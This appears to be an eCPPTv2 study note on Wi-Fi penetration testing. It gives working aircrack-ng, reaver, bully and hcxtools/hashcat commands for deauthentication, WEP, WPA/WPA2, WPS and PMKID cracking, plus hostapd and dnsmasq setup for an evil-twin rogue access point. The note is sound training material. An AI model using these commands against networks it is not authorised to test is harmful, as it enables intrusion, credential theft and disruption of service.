# Wi-Fi Pentest - eCPPTv2

## Overview
Wireless network penetration testing including WEP, WPA, WPA2, and WPA3 security.

**Sources**: 
- [johnermac.github.io](https://johnermac.github.io/notes/ecppt/wifi/)
- [dev-angelist/eCPPTv2-PTP-Notes](https://github.com/dev-angelist/eCPPTv2-PTP-Notes)

## Wireless Basics

### Standards
- **802.11a** - 5 GHz, up to 54 Mbps
- **802.11b** - 2.4 GHz, up to 11 Mbps
- **802.11g** - 2.4 GHz, up to 54 Mbps
- **802.11n** - 2.4/5 GHz, up to 600 Mbps
- **802.11ac** - 5 GHz, up to 1.3 Gbps
- **802.11ax** - Wi-Fi 6, up to 9.6 Gbps

### Security Protocols
- **WEP** - Wired Equivalent Privacy (deprecated)
- **WPA** - Wi-Fi Protected Access
- **WPA2** - Wi-Fi Protected Access 2
- **WPA3** - Wi-Fi Protected Access 3

## Tools

### Aircrack-ng Suite
```bash
# Monitor mode
airmon-ng start wlan0

# Capture packets
airodump-ng wlan0mon

# Deauth attack
aireplay-ng --deauth 0 -a <BSSID> wlan0mon

# Crack WEP
aircrack-ng <capture_file>.cap

# Crack WPA/WPA2
aircrack-ng -w <wordlist> <capture_file>.cap
```

### Wireshark
- Packet capture
- Protocol analysis
- Filtering

### Kismet
- Wireless network detector
- Sniffer
- IDS

## WEP Cracking

### Method
1. Put interface in monitor mode
2. Capture IVs (Initialization Vectors)
3. Use aircrack-ng to crack

```bash
# Capture
airodump-ng -c <channel> --bssid <BSSID> -w <output> wlan0mon

# Generate traffic (if needed)
aireplay-ng --arpreplay -b <BSSID> -h <client_MAC> wlan0mon

# Crack
aircrack-ng <capture_file>.cap
```

## WPA/WPA2 Cracking

### Method
1. Capture handshake (4-way handshake)
2. Deauthenticate clients to force reconnection
3. Crack with wordlist

```bash
# Capture handshake
airodump-ng -c <channel> --bssid <BSSID> -w <output> wlan0mon

# Deauth to capture handshake
aireplay-ng --deauth 4 -a <BSSID> -c <client_MAC> wlan0mon

# Crack
aircrack-ng -w <wordlist> <capture_file>.cap
```

### Wordlists
- RockYou
- Custom wordlists
- Crunch for generating wordlists

## WPS Attacks

### Reaver
```bash
reaver -i wlan0mon -b <BSSID> -vv
```

### Bully
```bash
bully wlan0mon -b <BSSID>
```

## Evil Twin

### Setup
1. Create fake access point
2. Deauthenticate clients
3. Capture credentials

### Tools
- hostapd
- dnsmasq
- ettercap

## Rogue Access Points

### Detection
- Monitor for duplicate SSIDs
- Check MAC addresses
- Analyze signal strength

### Creating Rogue AP
```bash
# Using hostapd
# Create hostapd.conf
interface=wlan0
driver=nl80211
ssid=TargetNetwork
hw_mode=g
channel=6

# Start hostapd
hostapd hostapd.conf

# Configure dnsmasq
# Create dnsmasq.conf
interface=wlan0
dhcp-range=192.168.4.2,192.168.4.20,255.255.255.0,12h
dhcp-option=3,192.168.4.1
dhcp-option=6,192.168.4.1

# Start dnsmasq
dnsmasq -C dnsmasq.conf -d

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Configure iptables
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
```

### Evil Twin Attack
```bash
# 1. Create fake AP with same SSID
# 2. Deauthenticate clients
aireplay-ng --deauth 0 -a <target_BSSID> wlan0mon

# 3. Capture handshake when clients reconnect
airodump-ng -c <channel> --bssid <fake_BSSID> -w capture wlan0mon

# 4. Capture credentials (if captive portal)
# Use dnsmasq and hostapd to create fake portal
```

## Additional Attacks

### Karma Attack
```bash
# Respond to any probe request
# Create AP with common SSID names
# Clients will connect automatically
```

### Cafe Latte Attack (WEP)
```bash
# Attack WEP without AP
# Target client instead of AP
# Force client to generate traffic
```

### Fragmentation Attack (WEP)
```bash
# Fragment packets to bypass filtering
aireplay-ng --fragment -b <BSSID> wlan0mon
```

### Chopchop Attack (WEP)
```bash
# Decrypt WEP packets without key
aireplay-ng --chopchop -b <BSSID> -h <client_MAC> wlan0mon
```

### PMKID Attack (WPA/WPA2)
```bash
# Capture PMKID from handshake
# Use hcxtools
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Convert to hashcat format
hcxpcaptool -z hash.hc22000 capture.pcapng

# Crack with hashcat
hashcat -m 22000 hash.hc22000 wordlist.txt
```

## WPA3 Attacks

### Dragonblood
```bash
# WPA3 downgrade attack
# Force WPA2 connection
# Then attack WPA2
```

## Tools

## Tools
- **Aircrack-ng** - WEP/WPA/WPA2 cracking
- **Reaver** - WPS attack tool
- **Bully** - WPS brute force
- **Wireshark** - Packet analysis
- **Kismet** - Wireless detector
- **hostapd** - AP daemon
- **dnsmasq** - DNS/DHCP server
- **hcxtools** - Capture and convert handshakes
- **hashcat** - Password cracking
- **John the Ripper** - Password cracking
- **Fern WiFi Cracker** - GUI tool
- **Wifite** - Automated WiFi cracking

## Methodology

### 1. Reconnaissance
- Identify target networks
- Monitor for clients
- Identify security protocols

### 2. Attack Selection
- WEP: Use IV collection
- WPA/WPA2: Capture handshake
- WPS: Use reaver/bully
- WPA3: Use downgrade attacks

### 3. Execution
- Put interface in monitor mode
- Capture traffic/handshake
- Perform attack
- Crack password

### 4. Post-Exploitation
- Connect to network
- Perform network reconnaissance
- Identify additional targets

## Resources
- **Aircrack-ng Documentation**: https://www.aircrack-ng.org/
- **WiFi Security**: https://www.wi-fi.org/discover-wi-fi/security

## Last Updated
January 2025

